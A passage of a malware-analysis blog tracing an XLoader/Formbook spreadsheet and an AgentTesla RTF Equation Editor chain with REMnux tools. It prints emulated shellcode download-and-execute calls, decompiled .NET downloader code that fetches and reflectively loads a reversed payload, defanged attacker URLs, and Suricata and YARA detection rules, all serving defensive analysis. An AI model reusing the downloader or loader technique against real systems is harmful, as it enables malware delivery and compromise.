object in the spreadsheet that doesn’t contain macro code. I’m leaning towards thinking it’s shellcode at this point. Since that A2 stream looks like it is larger, let’s extract it and see if xorsearch.py -W can help us find an entry point.remnux@remnux:~/cases/xloader-doc$ oledump.py -d -s A2 decrypted.xlsx &amp;gt; a2.datremnux@remnux:~/cases/xloader-doc$ file a2.dat a2.dat: packed dataremnux@remnux:~/cases/xloader-doc$ xorsearch -W a2.dat Found XOR 00 position 0000020E: GetEIP method 3 E9AE000000Found ROT 25 position 0000020E: GetEIP method 3 E9AE000000Found ROT 24 position 0000020E: GetEIP method 3 E9AE000000Found ROT 23 position 0000020E: GetEIP method 3 E9AE000000It looks like xorsearch found a GetEIP method at 0x20E in the A2 stream we exported. We can use this offset with scdbg to emulate shellcode execution and see if that is what downloads a subsequent stage. When looking at the report output from scdbg, we can see several familiar functions.401454 GetProcAddress(ExpandEnvironmentStringsW)401487 ExpandEnvironmentStringsW(%PUBLIC%\\vbc.exe, dst=12fb9c, sz=104)40149c LoadLibraryW(UrlMon)4014b7 GetProcAddress(URLDownloadToFileW)401505 URLDownloadToFileW(hxxp://2.58.149[.]229/namec.exe, C:\\users\\Public\\vbc.exe)40154d LoadLibraryW(shell32)401565 GetProcAddress(ShellExecuteExW)40156d unhooked call to shell32.ShellExecuteExWIn the shellcode, the adversary uses ExpandEnvironmentStringsW to find the Public folder in Windows. Next, they use URLDownloadToFileW to retrieve content from hxxp://2.58.149[.]229/namec.exe and write it to C:\\Users\\Public\\vbc.exe. Finally, they use ShellExecuteExW to launch vbc.exe.Triaging vbc.exeWe’re not going to entirely reverse engineer vbc.exe tonight, but we can get some identifying information about it. To start off, let’s take a look at some details using file and pedump.remnux@remnux:~/cases/xloader-doc$ file vbc.exe vbc.exe: PE32 executable (GUI) Intel 80386, for MS Windows, Nullsoft Installer self-extracting archiveThe file utility says that the EXE is a Nullsoft Installer archive. We can confirm this using a couple data points from pedump. First, we’ll want to look at the executable’s PE sections. The presence of a section named .ndata tends to indicate the EXE is a Nullsoft Installer. Also, the compiler information section of pedump output will show the executable was made with Nullsoft.remnux@remnux:~/cases/xloader-doc$ pedump -S --packer vbc.exe === SECTIONS === NAME RVA VSZ RAW_SZ RAW_PTR nREL REL_PTR nLINE LINE_PTR FLAGS .text 1000 5976 5a00 400 0 0 0 0 60000020 R-X CODE .rdata 7000 1190 1200 5e00 0 0 0 0 40000040 R-- IDATA .data 9000 1af98 400 7000 0 0 0 0 c0000040 RW- IDATA .ndata 24000 8000 0 0 0 0 0 0 c0000080 RW- UDATA .rsrc 2c000 900 a00 7400 0 0 0 0 40000040 R-- IDATA=== Packer / Compiler === Nullsoft install system v2.xTo squeeze the last bit of information from the vbc.exe binary, we can unpack it using 7z. To get the most information, including the NSIS configuration script, you’ll need a version that is several years old such as 15.05 like in this post. I went back and downloaded version 9.38.1 of p7zip-full, the Linux implementation of 7-zip.remnux@remnux:~/cases/xloader-doc/zip$ p7zip_9.38.1/bin/7z x vbc.exe 7-Zip 9.38 beta Copyright (c) 1999-2014 Igor Pavlov 2015-01-03p7zip Version 9.38.1 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,2 CPUs,ASM)Processing archive: vbc.exeExtracting 8yhm36shrfdb7mExtracting mhwrtExtracting lzxupx.exeExtracting [NSIS].nsiEverything is OkFiles: 4Size: 355002Compressed: 302002remnux@remnux:~/cases/xloader-doc/zip$ lltotal 10452drwxrwxr-x 3 remnux remnux 4096 Feb 11 23:30 ./drwxrwxr-x 4 remnux remnux 4096 Feb 11 23:28 ../-rw-rw-r-- 1 remnux remnux 216666 Feb 11 03:22 8yhm36shrfdb7m-rw-rw-r-- 1 remnux remnux 125952 Feb 11 03:22 lzxupx.exe-rw-rw-r-- 1 remnux remnux 7486 Feb 11 03:22 mhwrt-rw-rw-r-- 1 remnux remnux 4898 Feb 11 21:54 &#39;[NSIS].nsi&#39;drwx------ 6 remnux remnux 4096 Feb 11 23:28 p7zip_9.38.1/-rw-rw-r-- 1 remnux remnux 302002 Feb 11 21:54 vbc.exeWe can take a look in the [NSIS].nsi script and see what content would be executed:Function .onGUIInit InitPluginsDir ; Call Initialize_____Plugins ; SetDetailsPrint lastused SetOutPath $INSTDIR File 8yhm36shrfdb7m File mhwrt File lzxupx.exe ExecWait &quot;$INSTDIR\\lzxupx.exe $INSTDIR\\mhwrt&quot; Abort FlushINI $INSTDIR\\churches\\forget.bin Pop $R5 Push 31373 CopyFiles $INSTDIR\\unknowns\\hemlock.bmp $INSTDIR\\arboretum\\bitsy\\chances.tif ; $(LSTR_7)$INSTDIR\\arboretum\\bitsy\\chances.tif ; &quot;Copy to &quot; Nop Exec $INSTDIR\\mightier\\audit\\kahuna.pdf CreateDirectory $INSTDIR\\sail\\hold GetFullPathName $7 $INSTDIR\\cloak.csv Nop DetailPrint rstykivsbfr Exch $1 ; Push $1 ; Exch ; Pop $1 SetErrorLevel 3 CreateDirectory $INSTDIR\\manic\\sons\\folklore CreateDirectory $INSTDIR\\reaches CreateDirectory $INSTDIR\\scanning\\audit Nop ReadEnvStr $R2 TEMP DetailPrint sylsppbkgbyo Exch $8 ; Push $8 ; Exch ; Pop $8 Exch $R7 ; Push $R7 ; Exch ; Pop $R7 EnumRegKey $R5 HKLM oqyalkuqydrx 2236 FileWriteByte $5 765FunctionEndWhen the NSIS installer starts running, it will execute the commands in .onGUIInit. These three files get written: 8yhm36shrfdb7m mhwrt lzxupx.exeThe installer then runs the command &quot;$INSTDIR\\lzxupx.exe $INSTDIR\\mhwrt&quot;, waiting for the result. After it finishes, an Abort command processes. The abort causes the installer code to immediately skip to the function .onGUIEnd. Since this function isn’t defined in this particular script, the installer ends immediately.How Do We Know It’s XLoader/Formbook??This is where analysis dried up for me via code and I started leaning on sandbox output. Specifically, I looked at the report from Hatching Triage here: https://tria.ge/220211-wmgqsaeegl/behavioral1. When parsing the output, I noticed the sandbox made some identification based on the Suricata Emerging Threats rule ET MALWARE FormBook CnC Checkin (GET). Let’s see if we can validate that using the rule criteria and PCAP data from the sandbox. You can grab the Emerging Threats rules here: https://rules.emergingthreats.net/OPEN_download_instructions.html. I downloaded the PCAP from Tria.ge.Once we unpack the rules, we can search them using grep -F to quickly find the alert criteria.remnux@remnux:~/cases/xloader-doc/network/rules$ grep -F &#39;ET MALWARE FormBook CnC Checkin (GET)&#39; *emerging-malware.rules:alert http $HOME_NET any -&amp;gt; $EXTERNAL_NET any (msg:&quot;ET MALWARE FormBook CnC Checkin (GET)&quot;; flow:established,to_server; content:&quot;Connection|3a 20|close|0d 0a 0d 0a 00 00 00 00 00 00|&quot;; fast_pattern; http.method; content:&quot;GET&quot;; http.uri; content:&quot;/?&quot;; pcre:&quot;/^[A-Za-z0-9_-]{1,15}=(?:[A-Za-z0-9-_]{1,25}|(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{4}))&amp;amp;[A-Za-z0-9-]{1,15}=(?:[A-Za-z0-9-_]{1,25}|(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{4}))(?:&amp;amp;sql=\\d*)?$/R&quot;; http.connection; content:&quot;close&quot;; depth:5; endswith; http.header_names; content:&quot;|0d 0a|Host|0d 0a|Connection|0d 0a 0d 0a|&quot;; depth:22; endswith; reference:md5,a6a114f6bc3e86e142256c5a53675d1a; classtype:command-and-control; sid:2031412; rev:9; metadata:affected_product Windows_XP_Vista_7_8_10_Server_32_64_Bit, attack_target Client_Endpoint, created_at 2017_12_19, deployment Perimeter, former_category MALWARE, malware_family Formbook, performance_impact Moderate, signature_severity Major, updated_at 2020_09_16;)emerging-malware.rules:alert http $HOME_NET any -&amp;gt; $EXTERNAL_NET any (msg:&quot;ET MALWARE FormBook CnC Checkin (GET)&quot;; flow:established,to_server; content:&quot;Connection|3a 20|close|0d 0a 0d 0a 00 00 00 00 00 00|&quot;; fast_pattern; http.method; content:&quot;GET&quot;; http.uri; content:&quot;/?&quot;; pcre:&quot;/^[A-Za-z0-9_-]{1,15}=(?:[A-Za-z0-9-_]{1,25}|(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{4}))&amp;amp;[A-Za-z0-9-]{1,15}=(?:[A-Za-z0-9-_]{1,25}|(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{4}))(?:&amp;amp;sql=\\d*)?$/R&quot;; http.connection; content:&quot;close&quot;; depth:5; endswith; http.header_names; content:&quot;|0d 0a|Host|0d 0a|Connection|0d 0a 0d 0a|&quot;; depth:22; endswith; reference:md5,a6a114f6bc3e86e142256c5a53675d1a; classtype:command-and-control; sid:2031449; rev:9; metadata:attack_target Client_Endpoint, created_at 2017_12_19, former_category MALWARE, performance_impact Moderate, signature_severity Major, updated_at 2020_12_16;)emerging-malware.rules:alert http $HOME_NET any -&amp;gt; $EXTERNAL_NET any (msg:&quot;ET MALWARE FormBook CnC Checkin (GET)&quot;; flow:established,to_server; content:&quot;Connection|3a 20|close|0d 0a 0d 0a 00 00 00 00 00 00|&quot;; fast_pattern; http.method; content:&quot;GET&quot;; http.uri; content:&quot;/?&quot;; pcre:&quot;/^[A-Za-z0-9_-]{1,15}=(?:[A-Za-z0-9-_]{1,25}|(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{4}))&amp;amp;[A-Za-z0-9-]{1,15}=(?:[A-Za-z0-9-_]{1,25}|(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{4}))(?:&amp;amp;sql=\\d*)?$/R&quot;; http.connection; content:&quot;close&quot;; depth:5; endswith; http.header_names; content:&quot;|0d 0a|Host|0d 0a|Connection|0d 0a 0d 0a|&quot;; depth:22; endswith; reference:md5,a6a114f6bc3e86e142256c5a53675d1a; classtype:command-and-control; sid:2031453; rev:9; metadata:attack_target Client_Endpoint, created_at 2017_12_19, former_category MALWARE, performance_impact Moderate, signature_severity Major, updated_at 2020_12_23;)The first big pattern in the rules, content:&quot;Connection|3a 20|close|0d 0a 0d 0a 00 00 00 00 00 00|&quot;, is matched in a packet going to www.appleburyschool[.]com. Finally, the rest of the URI for the request matches a massive regular expression for Formbook/Xloader./^[A-Za-z0-9_-]{1,15}=(?:[A-Za-z0-9-_]{1,25}|(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{4}))&amp;amp;[A-Za-z0-9-]{1,15}=(?:[A-Za-z0-9-_]{1,25}|(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{4}))(?:&amp;amp;sql=\\d*)?$/R/b80i/?1bwhC=javT2wWCzY2TGjiLQcDYfNXvB4BbgLustNQoY/LvZGM3F6OzxMpM5exhHgP5m5g5&amp;amp;tB=TtdpPpwhOb1It’s also possible to validate findings using the memory dumps in Triage! One of the fields in Triage indicated a YARA rule tripped on the memory dump 636-73-0x0000000000400000-0x0000000000429000-memory.dmp, which can be downloaded. This is a memory dump from process ID 636 in that sandbox report, which corresponds to an evil lzxupx.exe process. Using yara-rules, we can see some evidence of Formbook:remnux@remnux:~/cases/xloader-doc$ yara-rules -s 636-73-0x0000000000400000-0x0000000000429000-memory.dmp CRC32b_poly_Constant 636-73-0x0000000000400000-0x0000000000429000-memory.dmp0x8bb7:$c0: B7 1D C1 04...Formbook 636-73-0x0000000000400000-0x0000000000429000-memory.dmp0x16ad9:$sqlite3step: 68 34 1C 7B E10x16bec:$sqlite3step: 68 34 1C 7B E10x16b08:$sqlite3text: 68 38 2A 90 C50x16c2d:$sqlite3text: 68 38 2A 90 C50x16b1b:$sqlite3blob: 68 53 D8 7F 8C0x16c43:$sqlite3blob: 68 53 D8 7F 8C...It looks like the contents of memory trip a YARA rules from JPCERT designed to detect Formbook in memory: https://github.com/Yara-Rules/rules/blob/master/malware/MalConfScan.yar#L381That’s all for now, folks, thanks for reading!" }, { "title": "AgentTesla From RTF Exploitation to .NET Tradecraft", "url": "/agenttesla-rtf-dotnet-tradecraft/", "categories": "malware", "tags": "malware, .net, agenttesla, rtf, equationeditor", "date": "2022-02-06 00:00:00 +0000", "snippet": "When adversaries buy and deploy threats like AgentTesla you often see this functional and entertaining chain of older exploitation activity with some .NET framework tradecraft you’d expect from some modern implants. In this post I’ll walk through analyzing one such sample that involves RTF/Equation Editor exploitation and a modular downloader that invokes AgentTesla. If you want to follow along at home, the sample is in MalwareBazaar here: https://bazaar.abuse.ch/sample/213d36f7d37abac0df9187e6ce3ed8e26bc61bd3e02a725b079be90d7cfd5117/.Triage the Document FileMalwareBazaar says we have a DOC file, but it could be wrong so let’s take a look with a couple different tools.remnux@remnux:~/cases/tesla-rtf$ file orden.doc orden.doc: Rich Text Format data, unknown versionremnux@remnux:~/cases/tesla-rtf$ diec orden.doc filetype: Binaryarch: NOEXECmode: Unknownendianess: LEtype: Unknown format: RTF format: plain text[CR]The magic bytes for this file make file and Detect-It-Easy think the it’s a Rich Text Format file. This file type shifts our analysis path a bit. If the document was a DOC or DOCX format we might expect VBA macros. In this case malicious RTF files commonly contain embedded OLE objects or exploit shellcode for a handful of CVEs in MS Office Equation Editor that are about 5 years old. But the exploits still work. Let’s see which attack path we have here.Analyzing the RTF DocumentOur first analysis path should be to rule out whether embedded OLE things are in the file. We can do this using a combination of rtfobj and rtfdump.py.remnux@remnux:~/cases/tesla-rtf$ rtfobj orden.rtf rtfobj 0.60 on Python 3.8.10 - http://decalage.info/python/oletoolsTHIS IS WORK IN PROGRESS - Check updates regularly!Please report any issue at https://github.com/decalage2/oletools/issues===============================================================================File: &#39;orden.rtf&#39; - size: 3852 bytes---+----------+---------------------------------------------------------------id |index |OLE Object ---+----------+---------------------------------------------------------------0 |00000120h |Not a well-formed OLE object ---+----------+---------------------------------------------------------------1 |000000CAh |Not a well-formed OLE object ---+----------+---------------------------------------------------------------remnux@remnux:~/cases/tesla-rtf$ rtfdump.py -f O orden.rtf remnux@remnux:~/cases/tesla-rtf$ The output from rtfobj and rtfdump.py both indicate there aren’t OLE objects expected here. If there were we’d likely see an OLE object describing a SCT script file or something similar. So I’m thinking we have RTF Equation Editor exploitation shellcode here. Let’s hunt for that using rtfdump.py.remnux@remnux:~/cases/tesla-rtf$ rtfdump.py orden.rtf 1 Level 1 c= 1 p=00000000 l= 3850 h= 3258; 3115 b= 0 u= 44 \\rtf4818 2 Level 2 c= 1 p=00000012 l= 3831 h= 3255; 3115 b= 0 u= 38 \\object18503741 3 Level 3 c= 2 p=000000b9 l= 3663 h= 3247; 3115 b= 0 u= 38 \\*\\objdata132794 4 Level 4 c= 1 p=000000cb l= 274 h= 21; 11 b= 0 u= 38 5 Level 5 c= 1 p=000000cc l= 272 h= 21; 11 b= 0 u= 38 ... 68 c= 0 p=000001ff l= 82 h= 18; 18 b= 0 u= 0 \\*\\levelprevspace569740588It looks like there are 68 streams here in the document, and we want to inspect the streams starting from largest to smallest until you start finding streams with hardly any data. In this document we’ll focus on the first 3 streams since they’re large.remnux@remnux:~/cases/tesla-rtf$ rtfdump.py -H -s 1 orden.rtf | head00000000: B5 61 85 03 74 16 DF DE F3 12 CD 0C 6C 23 D2 CC .a..t.......l#..00000010: 56 97 40 58 85 69 74 05 88 CA E9 7B 08 02 00 00 V.@X.it....{....00000020: 00 0B 00 00 00 45 71 55 41 54 69 4F 4E 2E 33 00 .....EqUATiON.3.00000030: 00 00 00 00 00 00 00 00 19 06 00 00 02 7E 01 EB .............~..00000040: 47 0A 01 05 A0 26 3B EC 00 00 00 00 00 00 00 00 G....&amp;amp;;.........00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................00000060: 00 50 06 45 00 00 00 00 00 00 00 00 00 00 00 00 .P.E............00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................00000080: 00 29 C3 44 00 00 00 00 E9 74 01 00 00 03 34 AD .).D.....t....4.00000090: 9D 71 6B 52 A9 8A 3B 6E 7B 04 76 FB 3A 6B AB E6 .qkR..;n{.v.:k..emnux@remnux:~/cases/tesla-rtf$ rtfdump.py -H -s 2 orden.rtf | head00000000: 18 50 37 41 6D FD EF 31 2C D0 C6 C2 3D 2C C5 69 .P7Am..1,...=,.i00000010: 74 05 88 56 97 40 58 8C AE 97 B0 80 20 00 00 00 t..V.@X..... ...00000020: B0 00 00 04 57 15 54 15 46 94 F4 E2 E3 30 00 00 ....W.T.F....0..00000030: 00 00 00 00 00 00 01 90 60 00 00 27 E0 1E B4 70 ........`..&#39;...p00000040: A0 10 5A 02 63 BE C0 00 00 00 00 00 00 00 00 00 ..Z.c...........00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 05 ................00000060: 00 64 50 00 00 00 00 00 00 00 00 00 00 00 00 00 .dP.............00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 02 ................00000080: 9C 34 40 00 00 00 0E 97 40 10 00 00 33 4A D9 D7 .4@.....@...3J..00000090: 16 B5 2A 98 A3 B6 E7 B0 47 6F B3 A6 BA BE 67 35 ..*.....Go....g5remnux@remnux:~/cases/tesla-rtf$ rtfdump.py -H -s 3 orden.rtf | head00000000: 6D FD EF 31 2C D0 C6 C2 3D 2C C5 69 74 05 88 56 m..1,...=,.it..V00000010: 97 40 58 8C AE 97 B0 80 20 00 00 00 B0 00 00 04 .@X..... .......00000020: 57 15 54 15 46 94 F4 E2 E3 30 00 00 00 00 00 00 W.T.F....0......00000030: 00 00 01 90 60 00 00 27 E0 1E B4 70 A0 10 5A 02 ....`..&#39;...p..Z.00000040: 63 BE C0 00 00 00 00 00 00 00 00 00 00 00 00 00 c...............00000050: 00 00 00 00 00 00 00 00 00 00 00 05 00 64 50 00 .............dP.00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................00000070: 00 00 00 00 00 00 00 00 00 00 00 02 9C 34 40 00 .............4@.00000080: 00 00 0E 97 40 10 00 00 33 4A D9 D7 16 B5 2A 98 ....@...3J....*.00000090: A3 B6 E7 B0 47 6F B3 A6 BA BE 67 35 C7 35 05 7C ....Go....g5.5.|Stream 1 has the string EqUATiON.3 pretty close to its head, so that’s going to be our best bet to keep analysis going. We can extract it using rtfdump.py again.remnux@remnux:~/cases/tesla-rtf$ rtfdump.py -d -H -s 1 orden.rtf &amp;gt; 1.datremnux@remnux:~/cases/tesla-rtf$ file 1.dat 1.dat: dataIt looks like the first stream exported and gave us some data as expected. For the next step, we need to deduce the entry point of the shellcode. From there we can emulate the shellcode execution. The best way I’ve seen to identify the shellcode entry point so far is to use xorsearch.py -W.remnux@remnux:~/cases/tesla-rtf$ xorsearch -W 1.dat Found XOR 00 position 00000201: GetEIP method 2 EB11Found ROT 25 position 00000201: GetEIP method 2 EB11Found ROT 24 position 00000201: GetEIP method 2 EB11Found ROT 23 position 00000201: GetEIP method 2 EB11Found ROT 22 position 00000201: GetEIP method 2 EB11Found ROT 21 position 00000201: GetEIP method 2 EB11Found ROT 20 position 00000201: GetEIP method 2 EB11Found ROT 19 position 00000201: GetEIP method 2 EB11Found ROT 18 position 00000201: GetEIP method 2 EB11Found ROT 17 position 00000201: GetEIP method 2 EB11Found ROT 16 position 00000201: GetEIP method 2 EB11Found ROT 15 position 00000201: GetEIP method 2 EB11Found ROT 14 position 00000201: GetEIP method 2 EB11Found ROT 13 position 00000201: GetEIP method 2 EB11Found ROT 12 position 00000201: GetEIP method 2 EB11Found ROT 11 position 00000201: GetEIP method 2 EB11Found ROT 10 position 00000201: GetEIP method 2 EB11Found ROT 09 position 00000201: GetEIP method 2 EB11Found ROT 08 position 00000201: GetEIP method 2 EB11Found ROT 07 position 00000201: GetEIP method 2 EB11Found ROT 06 position 00000201: GetEIP method 2 EB11Found ROT 05 position 00000201: GetEIP method 2 EB11Found ROT 04 position 00000201: GetEIP method 2 EB11Found ROT 03 position 00000201: GetEIP method 2 EB11Found ROT 02 position 00000201: GetEIP method 2 EB11Found ROT 01 position 00000201: GetEIP method 2 EB11Score: 260It looks like xorsearch.py located a GetEIP method used by shellcode to figure out its orientation in memory. We can feed that 00000201 offset into our shellcode emulator scdbg.And we get some text output from the emulator to show what the shellcode does (I went ahead and defanged the URL).401438 GetProcAddress(ExpandEnvironmentStringsW)401477 ExpandEnvironmentStringsW(%APPDATA%\\zxcbnmgu.exe, dst=12fad8, sz=104)40148c LoadLibraryW(UrlMon)4014a7 GetProcAddress(URLDownloadToFileW)401503 URLDownloadToFileW(hxxp://scottbyscott[.]com/ebux/try.exe, C:\\users\\remnux\\Application Data\\zxcbnmgu.exe)40151f GetProcAddress(WideCharToMultiByte)40153d WideCharToMultiByte(0,0,in=12fad8,sz=ffffffff,out=12fcf4,sz=104,0,0) = 040154d GetProcAddress(WinExec)401559 WinExec()40156d GetProcAddress(ExitProcess)401571 ExitProcess(0)There are a few Win32 API calls here, but there are only a few for us to worry about. The ExpandEnvironmentStringsW function looks like it’s preparing for the adversary to write a file to %APPDATA%\\zxcbnmgu.exe. Next, the URLDownloadToFileW function retrieves some content from scottbyscott[.]com and writes the EXE to that file under AppData. Finally, the downloaded application launches and Equation Editor exits using ExitProcess.Now we have some additional EXE content to work with!Analyzing the Try.exe BinaryUsing Detect-It-Easy we can see the try.exe binary is a .NET executable.remnux@remnux:~/cases/tesla-rtf$ diec try.exe filetype: PE32arch: I386mode: 32-bitendianess: LEtype: Console library: .NET(v4.0.30319)[-] linker: Microsoft Linker(48.0)[Console32,console]This is a stroke of good fortune for us, because we can pretty easily get this back to source code for inspection. To do so, we can use ilspycmd and pray there’s no obfuscation.remnux@remnux:~/cases/tesla-rtf$ ilspycmd try.exe &amp;gt; try.decompiled.csremnux@remnux:~/cases/tesla-rtf$ head try.decompiled.cs using System;using System.CodeDom.Compiler;using System.ComponentModel;using System.Configuration;using System.Diagnostics;using System.Globalization;using System.Net.Http;using System.Reflection;using System.Resources;using System.Runtime.CompilerServices;Awesome, it looks like we got some successful decompilation. Let’s inspect the code.[assembly: AssemblyTitle(&quot;Google Chrome&quot;)][assembly: AssemblyDescription(&quot;Google Chrome&quot;)][assembly: AssemblyConfiguration(&quot;&quot;)][assembly: AssemblyCompany(&quot;Google LLC&quot;)][assembly: AssemblyProduct(&quot;Google Chrome&quot;)][assembly: AssemblyCopyright(&quot;Copyright 2022 Google LLC. All rights reserved.&quot;)][assembly: AssemblyTrademark(&quot;&quot;)][assembly: ComVisible(false)][assembly: Guid(&quot;9ed52309-a8ba-46e5-8d13-1d18443695a0&quot;)][assembly: AssemblyFileVersion(&quot;100.0.4869.0&quot;)][assembly: TargetFramework(&quot;.NETFramework,Version=v4.6&quot;, FrameworkDisplayName = &quot;.NET Framework 4.6&quot;)][assembly: AssemblyVersion(&quot;100.0.4869.0&quot;)]Immediately in the assembly properties we can tell the adversary is trying to masquerade as Google Chrome. They’re trying to pose as Chrome v100. Another good data point is the GUID value in the assembly properties. If you have VirusTotal Enterprise/Intelligence you can plug that GUID into a search using netguid: and pivot to find similar .NET binaries. Alright, since this is a .NET EXE and not a DLL, let’s try to find the entry point. It should be the function Main().private static byte[] _buffer;private static Assembly _assembly;[STAThread]private static void Main(){ Native.ShowWindow(Process.GetCurrentProcess().get_MainWindowHandle(), 0); Read(); if (BufferLength() &amp;gt; 0) { if (Mix() &amp;gt; -1 &amp;amp;&amp;amp; ACMP() &amp;gt; -1) { Console.WriteLine(&quot;Done&quot;); } return; } throw new Exception();}Sure enough, we have a Main function that IS NOT OBFUSCATED! This calls for a drink. Anyways, it looks like Main calls 4 functions defined in the code: Read() BufferLength() Mix() ACMP()Let’s take a look at Read() first.private static bool Read(){ try { for (int i = 0; i &amp;lt; 5; i++) { ProcessStartInfo val = new ProcessStartInfo(); val.set_FileName(&quot;powershell&quot;); val.set_Arguments(&quot;Test-Connection 127.0.0.1&quot;); val.set_CreateNoWindow(true); val.set_WindowStyle((ProcessWindowStyle)1); Process.Start(val).WaitForExit(); } return true; } catch { } return false;}The Read() function looks like it pieces together a PowerShell connection using a ProcessStartInfo object and executes it with Process.Start, waiting for the process to finish. Once the command gets build and run, it’ll execute powershell.exe Test-Connection 127.0.0.1. The Test-Connection cmdlet in PowerShell is similar to a ping command. When I see this activity in the wild it’s usually either a connectivity test or a method to impose a time delay. Once this time delay finishes, the method returns and moves to BufferLength().private static long BufferLength(){ _buffer = ((Task&amp;lt;byte[]&amp;gt;)typeof(HttpClient).GetMethod(&quot;SrdsGetBySrdsteArrSrdsayAsySrdsnc&quot;.Replace(&quot;Srds&quot;, &quot;&quot;), new Type[1] { typeof(string) })!.Invoke(new HttpClient(), new object[1] { &quot;hxxp://185.222.58[.]56/try.png&quot; })).Result; return _buffer.Length;}So the BufferLength() function downloads content into a byte array in a rather verbose way. It searches the HttpClient .NET class for the method GetByteArrayAsync() and then invokes it with a URL argument. The result gets saved into _buffer, a byte array variable, and the function returns the length of this variable. The return value gets used in a BufferLength() &amp;gt; 0 check to make sure some content downloaded before proceeding. Now let’s look at the Mix() function.private static long Mix(){ Array.Reverse((Array)_buffer, 0, _buffer.Length); _assembly = Assembly.Load(_buffer); return _assembly.HostContext;}The Mix() function takes the _buffer variable, reverses its contents, and reflectively loads the reversed contents into a _assembly variable. At this point we can be pretty certain that _buffer contains a .NET assembly inside its byte array and that assembly is loaded into memory. From here, we can assume there will be some kind of Invoke method occurring in ACMP().private static long ACMP(){ Type[] exportedTypes = _assembly.GetExportedTypes(); foreach (Type type in exportedTypes) { MethodInfo[] methods = type.GetMethods(); foreach (MethodInfo methodInfo in methods) { if (methodInfo.Name == &quot;Qddywbxavgtbjaukcldrpmcm&quot;) { return (long)methodInfo.Invoke(null, null); } } } return 0L;}The ACMP() function enumerates the methods in the assembly that was just reflectively loaded in _assembly, looking for a method named Qddywbxavgtbjaukcldrpmcm(). Once found, it invokes the method.Thus ends the story of try.exe, now it’s time to analyze try.png that was downloaded.Analyzing the Try.PNG FileRemembering back to the Mix() function, the bytes of try.png are reversed before they get loaded as a .NET assembly. First, we need to make sure the file we have is a reversed EXE or DLL.remnux@remnux:~/cases/tesla-rtf$ xxd -C try.png | head00000000: 0000 0000 0000 0000 0000 0000 0000 0000 ................00000010: 0000 0000 0000 0000 0000 0000 0000 0000 ................00000020: 0000 0000 0000 0000 0000 0000 0000 0000 ................00000030: 0000 0000 0000 0000 0000 0000 0000 0000 ................00000040: 0000 0000 0000 0000 0000 0000 0000 0000 ................00000050: 0000 0000 0000 0000 0000 0000 0000 0000 ................00000060: 0000 0000 0000 0000 0000 0000 0000 0000 ................00000070: 0000 0000 0000 0000 0000 0000 0000 0000 ................00000080: 0000 0000 0000 0000 0000 0000 0000 0000 ................00000090: 0000 0000 0000 0000 0000 0000 0000 0000 ................remnux@remnux:~/cases/tesla-rtf$ xxd -C try.png | tail00082b60: 0008 2400 0006 010b 210e 00e0 0000 0000 ..$.....!.......00082b70: 0000 0000 61fd 4946 0003 014c 0000 4550 ....a.IF...L..EP00082b80: 0000 0000 0000 0024 0a0d 0d2e 6564 6f6d .......$....edom00082b90: 2053 4f44 206e 6920 6e75 7220 6562 2074 SOD ni nur eb t00082ba0: 6f6e 6e61 6320 6d61 7267 6f72 7020 7369 onnac margorp si00082bb0: 6854 21cd 4c01 b821 cd09 b400 0eba 1f0e hT!.L..!........00082bc0: 0000 0080 0000 0000 0000 0000 0000 0000 ................00082bd0: 0000 0000 0000 0000 0000 0000 0000 0000 ................00082be0: 0000 0000 0000 0040 0000 0000 0000 00b8 .......@........00082bf0: 0000 ffff 0000 0004 0000 0003 0090 5a4d ..............ZMSure enough, the end of try.png looks like it ends with a reversed MZ and has a reversed DOS stub. We can easily reverse these bytes using a bit of PowerShell code.[Byte[]] $contents = Get-Content -AsByteStream ./try.png [Array]::Reverse($contents)Set-Content -Path ./reversed_try.png -Value $contents -AsByteStreamNow we have a .NET DLL in reversed_try.png!remnux@remnux:~/cases/tesla-rtf$ diec reversed_try.png filetype: PE32arch: I386mode: 32-bitendianess: LEtype: DLL library: .NET(v4.0.30319)[-] linker: Microsoft Linker(6.0)[DLL32]Just like before with try.exe we can give this a shot at decompiling, but in this case there is a lot of obfuscation.remnux@remnux:~/cases/tesla-rtf$ ilspycmd reversed_try.png &amp;gt; reversed_try.decompiled.csremnux@remnux:~/cases/tesla-rtf$ head reversed_try.decompiled.cs using System;using System.CodeDom.Compiler;using System.Collections;using System.Collections.Concurrent;using System.Collections.Generic;using System.Diagnostics;using System.Drawing;using System.Globalization;using System.IO;using System.Reflection;We have some valid C# code, so let’s take a look and see how heavy the obfuscation is. Immediately we can see that the obfuscation is beyond just some string scrambling and gets into Unicode madness.internal class &amp;lt;Module&amp;gt;{ static &amp;lt;Module&amp;gt;() { if (uint.MaxValue != 0) { \\u0005\\u2009\\u2000.\\u0002(); } if (7u != 0) { f0659e5905454a5e99b9752afc78b700(); } if (true) { \\u0008\\u2002\\u2000.\\u0002(); } } private static void f0659e5905454a5e99b9752afc78b700() { if (4u != 0) { \\u0008\\u2009\\u2000.\\u0002(); } }}This is a level of obfuscation that tends to keep me up a little too late at night, so I’m going to cut analysis short here but mention another little part of this binary: .NET resources.Extracting .NET ResourcesIt’s really common for adversaries to hide executable content within Windows PE resources. The same is true of .NET assemblies, but assemblies have resources stored in a different way than traditional PE resources. AgentTesla has done this in the past and it seems like the same is occurring 